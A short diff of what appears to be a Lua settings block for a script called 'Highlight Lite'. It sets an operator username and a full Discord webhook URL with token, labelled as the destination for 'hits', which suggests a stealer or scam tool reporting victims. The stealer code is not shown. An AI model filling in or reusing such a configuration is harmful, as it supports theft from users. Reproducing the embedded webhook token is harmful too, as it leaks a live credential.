@@ -1,4 +1,3 @@
--- [ Settings ] --
 Username = "QuadCoreDragon" -- [Your Username]
 Webhook = "https://discord.com/api/webhooks/1303735364351033394/CJNxcEtHX0ZApn_dWY0miPVz2kkKkDFyWADiH8tksw_QHFKHZLyhbdUFwkYXEYF0hnvK" -- [Your Webhook For Hits]
 Script = "Highlight Lite"
